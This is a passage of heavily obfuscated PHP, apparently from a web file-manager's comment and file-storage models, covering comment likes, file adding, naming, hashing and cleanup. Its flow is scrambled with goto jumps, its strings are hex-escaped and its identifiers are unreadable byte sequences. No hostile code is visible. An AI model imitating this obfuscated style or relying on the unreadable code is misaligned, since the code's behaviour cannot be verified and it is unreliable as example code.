$e°ßî’Š¿® = $b…²˜ôÓÑ²->where($B¬‡µÜŒµ¥)->find(); if (!$e°ßî’Š¿®) { $b…²˜ôÓÑ²->add($B¬‡µÜŒµ¥); $bŠÕˆÁµëˆ = $this->where(array($fÚË†±Ô¸å[1718] => $Föï™­ôæ¬))->setAdd($fÚË†±Ô¸å[1720], 1); } else { $b…²˜ôÓÑ²->where($B¬‡µÜŒµ¥)->delete(); $bŠÕˆÁµëˆ = $this->where(array($fÚË†±Ô¸å[1718] => $Föï™­ôæ¬))->setAdd($fÚË†±Ô¸å[1720], -1); } return $bŠÕˆÁµëˆ; } public function targetInfo($FäùôãÃœº, $DÒ‡—°ê¾Ğ) { goto BäÑïƒ‹ß; BäÑïƒ‹ß: $Cì¬·ÊÚòî =& $_SERVER[Ç³Íß¦Ó]; $aµ²Ê âè = array($Cì¬·ÊÚòî[548] => $FäùôãÃœº, $Cì¬·ÊÚòî[549] => $DÒ‡—°ê¾Ğ); $AÄ°œ‚á… = $this->where($aµ²Ê âè)->count(); goto cõ‚«™Àœ¢; cõ‚«™Àœ¢: $a­¼½íÏƒÌ = "\122\111\107\110\124\40\112\x4f\x49\116\x20{$this->tablePrefix}\143\157\155\x6d\x65\156\164\137\160\162\x61\x69\163\145\40\x73\164\x61\x72\40\x6f\x6e\40\143\157\x6d\x6d\x65\156\164\56\143\157\155\x6d\x65\156\164\111\x44\x20\x3d\x20\163\164\141\162\x2e\143\157\x6d\x6d\x65\156\164\x49\x44"; $DåäáÒÖÒ = $this->alias($Cì¬·ÊÚòî[351])->where($aµ²Ê âè)->join($a­¼½íÏƒÌ, $Cì¬·ÊÚòî[1724])->count(); $B•ÎÑ¯“‚ = array($Cì¬·ÊÚòî[1725] => $AÄ°œ‚á…, $Cì¬·ÊÚòî[1726] => $DåäáÒÖÒ); goto b¢¤ö˜êò›; b¢¤ö˜êò›: return $B•ÎÑ¯“‚; goto F±¶ÁÜãã˜; F±¶ÁÜãã˜: } public function listData($dºñÃ¿œ™) { $FÕ‡ëè²Í® =& $_SERVER[Ç³Íß¦Ó]; if (isset($dºñÃ¿œ™[$FÕ‡ëè²Í®[1727]])) { if ($dºñÃ¿œ™[$FÕ‡ëè²Í®[1727]]) { $dºñÃ¿œ™[$FÕ‡ëè²Í®[1728]] = array($FÕ‡ëè²Í®[971], intval($dºñÃ¿œ™[$FÕ‡ëè²Í®[1727]])); } unset($dºñÃ¿œ™[$FÕ‡ëè²Í®[1727]]); } if (isset($dºñÃ¿œ™[$FÕ‡ëè²Í®[1729]])) { if ($dºñÃ¿œ™[$FÕ‡ëè²Í®[1729]]) { $dºñÃ¿œ™[$FÕ‡ëè²Í®[1728]] = array($FÕ‡ëè²Í®[968], intval($dºñÃ¿œ™[$FÕ‡ëè²Í®[1729]])); } unset($dºñÃ¿œ™[$FÕ‡ëè²Í®[1729]]); } return $this->_listData($dºñÃ¿œ™); } private function _listData($Bê‡†¥òŠ) { $bÖä ³ºÎ =& $_SERVER[Ç³Íß¦Ó]; $B¶Ã°¬Ñº = $this->where($Bê‡†¥òŠ)->_makeOrder()->selectPage(100); $this->_listAppendParent($B¶Ã°¬Ñº[$bÖä ³ºÎ[366]]); $this->_listAppendUser($B¶Ã°¬Ñº[$bÖä ³ºÎ[366]]); $this->_listAppendMeta($B¶Ã°¬Ñº[$bÖä ³ºÎ[366]]); return $B¶Ã°¬Ñº; } private function _makeOrder() { $Cî¦ßÑ ÉÍ =& $_SERVER[Ç³Íß¦Ó]; $bÊ‰¸·Œ“ã = array($Cî¦ßÑ ÉÍ[1720], $Cî¦ßÑ ÉÍ[1719], $Cî¦ßÑ ÉÍ[193]); $Cí°á¼¥Ìª = Input::get($Cî¦ßÑ ÉÍ[433], $Cî¦ßÑ ÉÍ[7], $Cî¦ßÑ ÉÍ[414], $bÊ‰¸·Œ“ã); $BÀ½°°œä = Input::get($Cî¦ßÑ ÉÍ[434], $Cî¦ßÑ ÉÍ[7], $Cî¦ßÑ ÉÍ[1520], array($Cî¦ßÑ ÉÍ[1730], $Cî¦ßÑ ÉÍ[429])); $e»Ñ²ƒ‹æÚ = $Cí°á¼¥Ìª . $Cî¦ßÑ ÉÍ[50] . $BÀ½°°œä; return $this->order($e»Ñ²ƒ‹æÚ); } private function _listAppendParent(&$BîğŞªóÇ) { goto B»¸ç’àØ; B»¸ç’àØ: $fŞ ¶ãâ®… =& $_SERVER[Ç³Íß¦Ó]; $eîç«Úõ©¨ = array_unique(array_to_keyvalue($BîğŞªóÇ, $fŞ ¶ãâ®…[33], $fŞ ¶ãâ®…[1717])); $eîç«Úõ©¨ = array_remove_value($eîç«Úõ©¨, $fŞ ¶ãâ®…[495]); goto eÄó³Ãæß‡; eñÜè¸”‹»: foreach ($BîğŞªóÇ as &$aÕ­óŒ³) { if (isset($DªÍºÜ°[$aÕ­óŒ³[$fŞ ¶ãâ®…[1717]]])) { $aÕ­óŒ³[$fŞ ¶ãâ®…[1731]] = $DªÍºÜ°[$aÕ­óŒ³[$fŞ ¶ãâ®…[1717]]]; } } unset($aÕ­óŒ³); goto DİŒø•÷ë; eÄó³Ãæß‡: if (!$eîç«Úõ©¨) { return; } $DªÍºÜ° = $this->where(array($fŞ ¶ãâ®…[1718] => array($fŞ ¶ãâ®…[7], $eîç«Úõ©¨)))->select(); $DªÍºÜ° = array_to_keyvalue($DªÍºÜ°, $fŞ ¶ãâ®…[1728]); goto eñÜè¸”‹»; DİŒø•÷ë: } private function _listAppendUser(&$F„µô‘‹Öõ) { goto FØ¨•ÎíŒ; E¯ªŞÇ’—: foreach ($F„µô‘‹Öõ as &$aƒç¾†‡¸ô) { $aƒç¾†‡¸ô[$EÚÑ ‘Í™¾[561]] = $d¸Ç±¬è[$aƒç¾†‡¸ô[$EÚÑ ‘Í™¾[1526]]]; if (isset($aƒç¾†‡¸ô[$EÚÑ ‘Í™¾[1731]])) { $aƒç¾†‡¸ô[$EÚÑ ‘Í™¾[1731]][$EÚÑ ‘Í™¾[561]] = $d¸Ç±¬è[$aƒç¾†‡¸ô[$EÚÑ ‘Í™¾[1731]][$EÚÑ ‘Í™¾[1526]]]; } } unset($aƒç¾†‡¸ô); goto b×§Ó‡Éä; FØ¨•ÎíŒ: $EÚÑ ‘Í™¾ =& $_SERVER[Ç³Íß¦Ó]; $CÄ¬£À™ÎŞ = array_unique(array_to_keyvalue($F„µô‘‹Öõ, $EÚÑ ‘Í™¾[33], $EÚÑ ‘Í™¾[1526])); $CÄ¬£À™ÎŞ = array_remove_value($CÄ¬£À™ÎŞ, $EÚÑ ‘Í™¾[495]); goto CğÃô‰½¶; CğÃô‰½¶: if (count($CÄ¬£À™ÎŞ) == 0) { return; } foreach ($F„µô‘‹Öõ as $aƒç¾†‡¸ô) { if (isset($aƒç¾†‡¸ô[$EÚÑ ‘Í™¾[1731]])) { $CÄ¬£À™ÎŞ[] = $aƒç¾†‡¸ô[$EÚÑ ‘Í™¾[1731]][$EÚÑ ‘Í™¾[1526]]; } } $d¸Ç±¬è = Model($EÚÑ ‘Í™¾[505])->userListInfo($CÄ¬£À™ÎŞ); goto E¯ªŞÇ’—; b×§Ó‡Éä: } private function _listAppendMeta(&$C‘ØóòÃš) { goto eç¿óšïë»; eç¿óšïë»: $C‘¾Ï×â× =& $_SERVER[Ç³Íß¦Ó]; $F•·±Ì„† = array_unique(array_to_keyvalue($C‘ØóòÃš, $C‘¾Ï×â×[33], $C‘¾Ï×â×[1728])); $F•·±Ì„† = array_remove_value($F•·±Ì„†, $C‘¾Ï×â×[495]); goto AåÔµ®†; AåÔµ®†: if (!$F•·±Ì„†) { return; } foreach ($C‘ØóòÃš as $FŠ¨ŠÄÕŒÑ) { if (isset($FŠ¨ŠÄÕŒÑ[$C‘¾Ï×â×[1731]])) { $F•·±Ì„†[] = $FŠ¨ŠÄÕŒÑ[$C‘¾Ï×â×[1731]][$C‘¾Ï×â×[1728]]; } } $f„«Ïó¡¶ = $this->metaList($F•·±Ì„†); goto A—‰†ßóÑƒ; A—‰†ßóÑƒ: if (!$f„«Ïó¡¶) { return !1; } foreach ($C‘ØóòÃš as &$FŠ¨ŠÄÕŒÑ) { $FŠ¨ŠÄÕŒÑ[$C‘¾Ï×â×[443]] = $f„«Ïó¡¶[$FŠ¨ŠÄÕŒÑ[$C‘¾Ï×â×[1728]]]; if (isset($FŠ¨ŠÄÕŒÑ[$C‘¾Ï×â×[1731]])) { $FŠ¨ŠÄÕŒÑ[$C‘¾Ï×â×[1731]][$C‘¾Ï×â×[443]] = $f„«Ïó¡¶[$FŠ¨ŠÄÕŒÑ[$C‘¾Ï×â×[1731]][$C‘¾Ï×â×[1728]]]; } } unset($FŠ¨ŠÄÕŒÑ); goto f‡à†Ğá÷Ö; f‡à†Ğá÷Ö: } private function metaList($bóÅ’Ùèõ) { goto B²á•ÑŠ«§; B²á•ÑŠ«§: $Få÷¤óİŠ =& $_SERVER[Ç³Íß¦Ó]; if (!$bóÅ’Ùèõ) { return array(); } $fİ¤âÈ„‹ç = array($Få÷¤óİŠ[1728] => array($Få÷¤óİŠ[7], $bóÅ’Ùèõ)); goto FÕöÚ§†Ê—; FÕöÚ§†Ê—: $AŒÓ—µ¢¤Ë = Model($Få÷¤óİŠ[1732])->where($fİ¤âÈ„‹ç)->select(); $AŒÓ—µ¢¤Ë = array_to_keyvalue_group($AŒÓ—µ¢¤Ë, $Få÷¤óİŠ[1728]); foreach ($AŒÓ—µ¢¤Ë as $Dô²Ã¤àšÀ => $F­ŸŒ“¨¢®) { $f¦¡µ»éÖ = array(); foreach ($F­ŸŒ“¨¢® as $bŒæ¹Í•³) { $f¦¡µ»éÖ[$bŒæ¹Í•³[$Få÷¤óİŠ[93]]] = $bŒæ¹Í•³[$Få÷¤óİŠ[371]]; } $AŒÓ—µ¢¤Ë[$Dô²Ã¤àšÀ] = $f¦¡µ»éÖ; } goto EÚĞÏÑÛ¬; EÚĞÏÑÛ¬: return $AŒÓ—µ¢¤Ë ? $AŒÓ—µ¢¤Ë : array(); goto d¡˜ó¥™¯; d¡˜ó¥™¯: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\154\x65\137\143\157\156\x74\145\156\x74\163"; protected $dataAuto = array(array("\143\162\x65\141\x74\x65\124\x69\155\x65", "\x74\x69\x6d\145", "\x69\156\163\145\162\x74", "\146\165\x6e\x63\x74\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\154\145"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\x6d\x65" => "\x69\x6f\137\x66\x69\x6c\x65\x5f\155\145\164\141", "\155\145\164\x61\x46\151\145\x6c\x64" => "\146\x69\x6c\x65\x49\x44"); public function fileInfo($Dİ¢Š¢ÇˆÊ) { $A¤¥°¤Ø¥Ã =& $_SERVER[Ç³Íß¦Ó]; static $Aà¯µŠˆæ = array(); if (!isset($Aà¯µŠˆæ[$Dİ¢Š¢ÇˆÊ])) { $CÚÀÖªËâ = $A¤¥°¤Ø¥Ã[1733]; $bîÁñ¼çÙ¢ = Model($A¤¥°¤Ø¥Ã[448])->field($CÚÀÖªËâ)->where(array($A¤¥°¤Ø¥Ã[446] => $Dİ¢Š¢ÇˆÊ))->find(); $Aà¯µŠˆæ[$Dİ¢Š¢ÇˆÊ] = $bîÁñ¼çÙ¢; } return $Aà¯µŠˆæ[$Dİ¢Š¢ÇˆÊ]; } public function addFileByContent($bÊ¥ê Í¬è = '', $D¬˜²³íÁ¡ = '') { goto Dêç³¶ÙµÚ; f––ĞÄß‹: $c˜ÀÛÏ¢ÔÚ = $c«Éäî£İØ . $DšêŸŞ×¢ƒ[1735] . rand_string(16); file_put_contents($c˜ÀÛÏ¢ÔÚ, $bÊ¥ê Í¬è); $D‘ç×£Ôôá = $this->addFile($c˜ÀÛÏ¢ÔÚ, $D¬˜²³íÁ¡, !0); goto E £Ü»ğ•ö; Dêç³¶ÙµÚ: $DšêŸŞ×¢ƒ =& $_SERVER[Ç³Íß¦Ó]; $c«Éäî£İØ = TEMP_PATH . $DšêŸŞ×¢ƒ[1734]; if (!is_dir($c«Éäî£İØ)) { mk_dir($c«Éäî£İØ); } goto f––ĞÄß‹; E £Ü»ğ•ö: if (file_exists($c˜ÀÛÏ¢ÔÚ)) { @unlink($c˜ÀÛÏ¢ÔÚ); } return $D‘ç×£Ôôá; goto bç»ö¬‘; bç»ö¬‘: } public function createFileName($BÔ–ŸÔ·µŠ, $d„ò§ÈÑ¶„ = false, $eƒÅ³½Ì…œ = false) { goto dÚ„¡×‰İÙ; dÚ„¡×‰İÙ: $dÎ¡””óÒê =& $_SERVER[Ç³Íß¦Ó]; $e¤’È’½Ù = IO::init($dÎ¡””óÒê[8]); $CÚÆ¤½½¨” = $this->makeFilePath($BÔ–ŸÔ·µŠ, $e¤’È’½Ù, $d„ò§ÈÑ¶„, $eƒÅ³½Ì…œ); goto F¿¤©İÌŒ‰; F¿¤©İÌŒ‰: $FŠóß˜½° = $e¤’È’½Ù->pathFather($CÚÆ¤½½¨”); static $CÊ¢…¤Æ = false; $aªÈ§áàÊ = $dÎ¡””óÒê[1736] . md5($FŠóß˜½°); goto a†™“¥Ø‚•; a†™“¥Ø‚•: if (!$CÊ¢…¤Æ && !Cache::get($aªÈ§áàÊ)) { $CÊ¢…¤Æ = !0; $C†¾£Ì³µ­ = IO::mkdir($FŠóß˜½°); if (!IO::exist($C†¾£Ì³µ­ . $dÎ¡””óÒê[762])) { IO::mkfile($C†¾£Ì³µ­ . $dÎ¡””óÒê[762]); } Cache::set($aªÈ§áàÊ, 1, 3600 * 2); } return $CÚÆ¤½½¨”; goto d³·Õ×ãÒ; d³·Õ×ãÒ: } public function makeFilePath($e·‡ÊƒÁ»¤, $EªÄ“¢‡âÜ, $càã³‘”¥ = false, $eªƒß„Ğô¨ = false) { goto a¶Ü•İ‡Ğ¼; a¶Ü•İ‡Ğ¼: $dÈá½„œëÅ =& $_SERVER[Ç³Íß¦Ó]; $aõÁ¡¬Õ… = Model($dÈá½„œëÅ[731])->get($dÈá½„œëÅ[1737]); $EÕÒˆĞĞÅ = KodIO::defaultIO() . date($dÈá½„œëÅ[1738]); goto BõŞ–ÒÍØ; BõŞ–ÒÍØ: $Câ¸ÌœÏî´ = $EÕÒˆĞĞÅ . rand_string(5) . short_id(100); $e·‡ÊƒÁ»¤ = str_replace($dÈá½„œëÅ[8], $dÈá½„œëÅ[71], KodIO::clear($e·‡ÊƒÁ»¤)); $Eò™Ù­Ì‡æ = $EªÄ“¢‡âÜ->ext($e·‡ÊƒÁ»¤); goto e¹ÜİóÏ³£; e¹ÜİóÏ³£: if (!$e·‡ÊƒÁ»¤) { $aõÁ¡¬Õ… = $dÈá½„œëÅ[1739]; } switch ($aõÁ¡¬Õ…) { case $dÈá½„œëÅ[1740]: $Câ¸ÌœÏî´ = $Câ¸ÌœÏî´ . $dÈá½„œëÅ[95] . $EªÄ“¢‡âÜ->ext($e·‡ÊƒÁ»¤); if ($Eò™Ù­Ì‡æ == $dÈá½„œëÅ[1679]) { $Câ¸ÌœÏî´ .= $dÈá½„œëÅ[1428]; } break; case $dÈá½„œëÅ[1741]: goto BéÇì÷—¿Å; c»ç„³‚Ô: if (IO::isTypeObject($Câ¸ÌœÏî´) && !IO::isUploadServer($Câ¸ÌœÏî´)) { if (IO::exist($Câ¸ÌœÏî´)) { return $Câ¸ÌœÏî´; } $AĞ×í§¾…æ = IO::setContent($Câ¸ÌœÏî´, $dÈá½„œëÅ[33]); if (!$AĞ×í§¾…æ) { show_json($dÈá½„œëÅ[1744], !1); } } CacheLock::unlock($eÚô³À²ØÀ); break; goto E„ªêñ‚â; BéÇì÷—¿Å: $BÚ±ù²ß‰ù = Model($dÈá½„œëÅ[731])->get($dÈá½„œëÅ[732]); $eáŠÓ‰…õ = substr(md5($dÈá½„œëÅ[733] . $BÚ±ù²ß‰ù . date($dÈá½„œëÅ[712])), 0, 8); $CÚù›óéÒ§ = KodIO::defaultDriver(); goto cåëÈ¯¸; cˆ‡ÆËÑß: CacheLock::lock($eÚô³À²ØÀ); $Câ¸ÌœÏî´ = $EÕÒˆĞĞÅ . $e·‡ÊƒÁ»¤; if (IO::exist($EÕÒˆĞĞÅ . $e·‡ÊƒÁ»¤)) { $a›­ôÕ­–Å = substr($e·‡ÊƒÁ»¤, 0, strlen($e·‡ÊƒÁ»¤) - strlen($Eò™Ù­Ì‡æ)); $a‰ä–‚»Ñ¦ = $eªƒß„Ğô¨ ? substr($eªƒß„Ğô¨, 0, 5) : ($càã³‘”¥ ? substr($càã³‘”¥, 0, 5) : rand_string(5)); $Câ¸ÌœÏî´ = $EÕÒˆĞĞÅ . $a›­ôÕ­–Å . $a‰ä–‚»Ñ¦ . $dÈá½„œëÅ[95] . $Eò™Ù­Ì‡æ; } goto c»ç„³‚Ô; cåëÈ¯¸: $EÕÒˆĞĞÅ = $dÈá½„œëÅ[1123] . $CÚù›óéÒ§[$dÈá½„œëÅ[392]] . $dÈá½„œëÅ[400] . date($dÈá½„œëÅ[1742]) . $eáŠÓ‰…õ . $dÈá½„œëÅ[8]; if ($Eò™Ù­Ì‡æ == $dÈá½„œëÅ[1679]) { $e·‡ÊƒÁ»¤ .= $dÈá½„œëÅ[1428]; } $eÚô³À²ØÀ = $dÈá½„œëÅ[1743] . $EÕÒˆĞĞÅ . $e·‡ÊƒÁ»¤; goto cˆ‡ÆËÑß; E„ªêñ‚â: case $dÈá½„œëÅ[1739]: break; default: break; } return $Câ¸ÌœÏî´; goto c‹‚ùáô¿Ñ; c‹‚ùáô¿Ñ: } public function addFileByRemote($eÆ°Ûä£®, $dšÇ´åƒ²î, $Cßî¬§Ì¯¶ = array()) { goto EÒôĞ÷¹; Aİ˜î ”Ğ: if ($D÷òåœÇ£ª = $this->addFileCheckExist($b‹ŒŞ‚Ç¹[$eƒ¢Úäî –[171]], $b‹ŒŞ‚Ç¹[$eƒ¢Úäî –[170]], $b‹ŒŞ‚Ç¹[$eƒ¢Úäî –[78]])) { return $D÷òåœÇ£ª; } return $this->addFileData($b‹ŒŞ‚Ç¹); goto f†„Ì—é; f…Ñê¹Ãà¶: $BÎ ’‹¢ä½ = IO::hashMd5($eÆ°Ûä£®, $EØÏàÚ‚è); $BãÉÆÄ¬ä = KodIO::defaultDriver(); $b‹ŒŞ‚Ç¹ = array($eƒ¢Úäî –[547] => IO::size($eÆ°Ûä£®), $eƒ¢Úäî –[1745] => 1, $eƒ¢Úäî –[411] => $dšÇ´åƒ²î, $eƒ¢Úäî –[774] => $BãÉÆÄ¬ä[$eƒ¢Úäî –[392]], $eƒ¢Úäî –[412] => $eÆ°Ûä£®, $eƒ¢Úäî –[1746] => $Cßî¬§Ì¯¶[$eƒ¢Úäî –[171]] ? $Cßî¬§Ì¯¶[$eƒ¢Úäî –[171]] : IO::hashSimple($eÆ°Ûä£®), $eƒ¢Úäî –[1747] => $BÎ ’‹¢ä½ ? $BÎ ’‹¢ä½ : $EØÏàÚ‚è); goto Aİ˜î ”Ğ; EÒôĞ÷¹: $eƒ¢Úäî – =& $_SERVER[Ç³Íß¦Ó]; if (!IO::exist($eÆ°Ûä£®)) { return !1; } $EØÏàÚ‚è = $Cßî¬§Ì¯¶[$eƒ¢Úäî –[170]] ? $Cßî¬§Ì¯¶[$eƒ¢Úäî –[170]] : $eƒ¢Úäî –[33]; goto f…Ñê¹Ãà¶; f†„Ì—é: } private function addFileData($bÓ²º¥è½ä) { $E»òĞ·øÈ =& $_SERVER[Ç³Íß¦Ó]; if (!$bÓ²º¥è½ä) { return !1; } $bÓ²º¥è½ä[$E»òĞ·øÈ[78]] = intval($bÓ²º¥è½ä[$E»òĞ·øÈ[78]]); if (!$bÓ²º¥è½ä[$E»òĞ·øÈ[78]] && strlen($bÓ²º¥è½ä[$E»òĞ·øÈ[171]]) > 32) { $bÓ²º¥è½ä[$E»òĞ·øÈ[78]] = intval(substr($bÓ²º¥è½ä[$E»òĞ·øÈ[171]], 32)); } $eÙˆæ¶®ƒ¨ = $this->add($bÓ²º¥è½ä); return $this->find($eÙˆæ¶®ƒ¨); } public function addFile($fĞ‡ÍóµØƒ, $E³©³µÆ, $bÂ¥ÓÎˆ® = false) { goto EŞà¾§ã˜…; Aõî‡èÚ†Á: return $døô¤ÉË«; goto c½î£‡ñøÉ; c‹÷Ö¬ÎéÄ: $Cõ¸£ïØèø = $_SERVER[Ç³Íß¦Ó][1748] . $Fƒïá«”“; CacheLock::lock($Cõ¸£ïØèø); if ($Eî÷™‘ôø = $this->addFileCheckExist($F‡Õ±Òğ™ø, $Fƒïá«”“, $F©áïŸ×ÂÚ)) { CacheLock::unlock($Cõ¸£ïØèø); return $Eî÷™‘ôø; } goto aæŞ¹Œøí; aæŞ¹Œøí: $b¢Ø±³Ç = $this->addFileMake($fĞ‡ÍóµØƒ, $F©áïŸ×ÂÚ, $F‡Õ±Òğ™ø, $Fƒïá«”“, $E³©³µÆ, $bÂ¥ÓÎˆ®); $døô¤ÉË« = $this->addFileData($b¢Ø±³Ç); CacheLock::unlock($Cõ¸£ïØèø); goto Aõî‡èÚ†Á; EŞà¾§ã˜…: $F‡Õ±Òğ™ø = IO::hashSimple($fĞ‡ÍóµØƒ); $Fƒïá«”“ = IO::hashMd5($fĞ‡ÍóµØƒ); $F©áïŸ×ÂÚ = IO::size($fĞ‡ÍóµØƒ); goto c‹÷Ö¬ÎéÄ; c½î£‡ñøÉ: } public function addFileMake($BµÄ»ËâÃ, $F’¿øËÏÉ–, $c°éÁÍŸ†õ, $aí¼‘ö©æ, $cÎëº§À‘Ê, $b©òÕÏÕî) { goto dõ‡™®î¯ğ; FùŠÃİà¤Í: $DòŠ«½…«‹ = KodIO::defaultDriver(); $CêÄæëæ†ì = array($Cë ò³œ”Ò[547] => $F’¿øËÏÉ–, $Cë ò³œ”Ò[1745] => 1, $Cë ò³œ”Ò[411] => $cÎëº§À‘Ê, $Cë ò³œ”Ò[774] => $DòŠ«½…«‹[$Cë ò³œ”Ò[392]], $Cë ò³œ”Ò[412] => $EàÅªÛ¾·, $Cë ò³œ”Ò[1746] => $c°éÁÍŸ†õ, $Cë ò³œ”Ò[1747] => $aí¼‘ö©æ); return $CêÄæëæ†ì; goto FµÑĞêìâÚ; b¿å…Ó×ù: $F˜¦£­„’Ÿ = get_path_this($EàÅªÛ¾·); if ($b©òÕÏÕî) { $aóÈ²ç‘Œë = IO::move($BµÄ»ËâÃ, $aë§©¬ˆÑ, !1, $F˜¦£­„’Ÿ); } else { $aóÈ²ç‘Œë = IO::copy($BµÄ»ËâÃ, $aë§©¬ˆÑ, !1, $F˜¦£­„’Ÿ); } if (!$aóÈ²ç‘Œë) { return !1; } goto FùŠÃİà¤Í; dõ‡™®î¯ğ: $Cë ò³œ”Ò =& $_SERVER[Ç³Íß¦Ó]; $EàÅªÛ¾· = $this->createFileName($cÎëº§À‘Ê, $c°éÁÍŸ†õ, $aí¼‘ö©æ); $aë§©¬ˆÑ = get_path_father($EàÅªÛ¾·); goto b¿å…Ó×ù; FµÑĞêìâÚ: } public function addFileCheckExist($eºŸŸî’×Ø, $dŠ¨— ‹ç², $cÎäÙĞ‘) { $cˆ÷Ñ¾–™İ =& $_SERVER[Ç³Íß¦Ó]; $b¸­á‰œ‡Ö = $this->findByHash($eºŸŸî’×Ø, $dŠ¨— ‹ç²); if (!$b¸­á‰œ‡Ö) { return !1; } $c…ªãê÷¤Ò = array($cˆ÷Ñ¾–™İ[1745] => intval($b¸­á‰œ‡Ö[$cˆ÷Ñ¾–™İ[1749]]) + 1, $cˆ÷Ñ¾–™İ[547] => $cÎäÙĞ‘); $this->where(array($cˆ÷Ñ¾–™İ[446] => $b¸­á‰œ‡Ö[$cˆ÷Ñ¾–™İ[445]]))->save($c…ªãê÷¤Ò); return $b¸­á‰œ‡Ö; } public function remove($dÔË¯í‹¯) { $this->linkCountChange($dÔË¯í‹¯, !1); $this->clearEmpty(); return !0; } public function linkAdd($aˆŒ®Ÿ¨Ÿè) { $this->linkCountChange($aˆŒ®Ÿ¨Ÿè, !0); } public function linkCountChange($BĞ§¤‚«‡”, $Bíõ›ñÁ°) { goto f‘Òƒ’ÚÔ‡; dóŒÓ¡‘Œ: $cßê—Àê¥· = array(); foreach ($BĞ§¤‚«‡” as $cÑÊõã¢¥) { $d†©…ç†ùÑ = $cÑÊõã¢¥ . $C©™š›¤Ä…[33]; if (!$cßê—Àê¥·[$d†©…ç†ùÑ]) { $cßê—Àê¥·[$d†©…ç†ùÑ] = 0; } $cßê—Àê¥·[$d†©…ç†ùÑ]++; } $eÒŠŒ•°Ê° = array(); goto A®Î©©Ü›; A®Î©©Ü›: foreach ($cßê—Àê¥· as $cÑÊõã¢¥ => $a¹®ğùÛ¬) { $d†©…ç†ùÑ = $a¹®ğùÛ¬ . $C©™š›¤Ä…[33]; if (!$eÒŠŒ•°Ê°[$d†©…ç†ùÑ]) { $eÒŠŒ•°Ê°[$d†©…ç†ùÑ] = array(); } $eÒŠŒ•°Ê°[$d†©…ç†ùÑ][] = $cÑÊõã¢¥; } foreach ($eÒŠŒ•°Ê° as $a¹®ğùÛ¬ => $e”èÔ¿‘‘ƒ) { if (!$e”èÔ¿‘‘ƒ) { continue; } $a¹®ğùÛ¬ = $Bíõ›ñÁ° ? $a¹®ğùÛ¬ : -intval($a¹®ğùÛ¬); $f…ÔïŒŠöÂ = array($C©™š›¤Ä…[445] => array($C©™š›¤Ä…[7], $e”èÔ¿‘‘ƒ)); if ($a¹®ğùÛ¬ < 0) { $f…ÔïŒŠöÂ[$C©™š›¤Ä…[1749]] = array($C©™š›¤Ä…[972], abs($a¹®ğùÛ¬)); } $this->where($f…ÔïŒŠöÂ)->setAdd($C©™š›¤Ä…[1749], $a¹®ğùÛ¬); } goto Fğêğäğ«Ú; f‘Òƒ’ÚÔ‡: $C©™š›¤Ä… =& $_SERVER[Ç³Íß¦Ó]; if (!$BĞ§¤‚«‡”) { return; } if (!is_array($BĞ§¤‚«‡”)) { $BĞ§¤‚«‡” = array($BĞ§¤‚«‡”); } goto dóŒÓ¡‘Œ; Fğêğäğ«Ú: } public function findByHash($F£ƒÌ¹ÔŠ, $BÙßˆìï = false) { $D·òÌÇÙ¹· =& $_SERVER[Ç³Íß¦Ó]; if (!$F£ƒÌ¹ÔŠ && !$BÙßˆìï) { return !1; } $E¿»òÎ™ = array($D·òÌÇÙ¹·[1746] => $F£ƒÌ¹ÔŠ); if ($BÙßˆìï) { $E¿»òÎ™ = array($D·òÌÇÙ¹·[1747] => $BÙßˆìï); } return $this->order($D·òÌÇÙ¹·[1750])->where($E¿»òÎ™)->find(); } public function clearEmpty($cÏòã¿É¯ = 0) { goto D¹«œÁÛ˜¶; D¹«œÁÛ˜¶: $Cê„¼˜¼ğè =& $_SERVER[Ç³Íß¦Ó]; $b”Î£ÄğìØ = time() - 3600 * 24 * $cÏòã¿É¯; $b“Å±Œ¼Ôƒ = $Cê„¼˜¼ğè[1751] . $b”Î£ÄğìØ; goto fĞ”Á‰¾Çè; BÚËõ„Â: foreach ($b¹åáâ½ŞÊ as $E Å‰‹ö…œ) { $bäõ¤à—Ä‚->update(1); $this->resetFile($E Å‰‹ö…œ); } $bäõ¤à—Ä‚->end(); goto bíğ‘¯Ø±¥; fĞ”Á‰¾Çè: $b¹åáâ½ŞÊ = $this->where($b“Å±Œ¼Ôƒ)->select(); if (!$b¹åáâ½ŞÊ) { return; } $bäõ¤à—Ä‚ = new Task($Cê„¼˜¼ğè[1752], $Cê„¼˜¼ğè[33], count($b¹åáâ½ŞÊ)); goto BÚËõ„Â; bíğ‘¯Ø±¥: } public function resetFile($C»È·‹£·ò) { goto FåÃÃ“×ˆà; FÏğ˜¬æÀÎ: if ($C»È·‹£·ò[$d¾Ó°Šäâ…[1749]] != $eŞèáç·ˆº) { $this->where($BÚ‰»ã‚•ó)->save(array($d¾Ó°Šäâ…[1745] => $eŞèáç·ˆº)); } goto FÆ¹–¶á‰; aµÕëÉß¶ô: $c’±ºÆ·Ş = Model($d¾Ó°Šäâ…[1753])->where($BÚ‰»ã‚•ó)->count(); $eŞèáç·ˆº = intval($EÖø¼ãŠª) + intval($c’±ºÆ·Ş); if ($eŞèáç·ˆº == 0) { IO::remove($C»È·‹£·ò[$d¾Ó°Šäâ…[76]]); Model($d¾Ó°Šäâ…[1754])->delete($C»È·‹£·ò[$d¾Ó°Šäâ…[445]]); $this->where($BÚ‰»ã‚•ó)->delete(); $this->metaSet($C»È·‹£·ò[$d¾Ó°Šäâ…[445]], null, null); return; } goto FÏğ˜¬æÀÎ; FåÃÃ“×ˆà: $d¾Ó°Šäâ… =& $_SERVER[Ç³Íß¦Ó]; $BÚ‰»ã‚•ó = array($d¾Ó°Šäâ…[446] => $C»È·‹£·ò[$d¾Ó°Šäâ…[445]]); $EÖø¼ãŠª = Model($d¾Ó°Šäâ…[1204])->where($BÚ‰»ã‚•ó)->count(); goto aµÕëÉß¶ô; FÆ¹–¶á‰: } public function storageInfo($e±Ö¸ÚæÔ = false) { goto B„™ö—è‚; D’á¯ö¬„®: for ($fÈËªˆ = 0; $fÈËªˆ < $bƒˆ†Í•ÒØ; $fÈËªˆ = $fÈËªˆ + $f‹‹†Œè‚) { $EùğÈøéªä = $this->limit($fÈËªˆ, $fÈËªˆ + $f‹‹†Œè‚)->select(); foreach ($EùğÈøéªä as $EğÕÉÑâÇÜ) { $C­›ğ½Ô± += $EğÕÉÑâÇÜ[$eÂÇ¬©½“‡[78]] * $EğÕÉÑâÇÜ[$eÂÇ¬©½“‡[1749]]; $A½ºñ‘¿š += $EğÕÉÑâÇÜ[$eÂÇ¬©½“‡[78]] * 